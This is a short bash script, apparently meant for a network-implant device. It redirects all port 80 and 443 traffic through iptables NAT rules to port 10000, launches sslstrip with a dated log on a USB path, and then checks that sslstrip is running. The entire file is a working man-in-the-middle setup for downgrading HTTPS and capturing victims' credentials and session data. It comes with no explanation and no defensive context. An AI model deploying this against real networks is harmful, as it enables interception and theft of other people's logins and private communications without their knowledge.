#!/bin/bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 10000

sslstrip -w /usb/$(date +'%m%d%y')sslstrip.log &

sleep 10

if ! ( pidof python /usb/usr/bin/sslstrip); then
	logger "SSLstrip didn't seem to start........Check log for more details"
echo "SSLstrip didn't start!"

else
	logger "SSLstrip started....."
fi
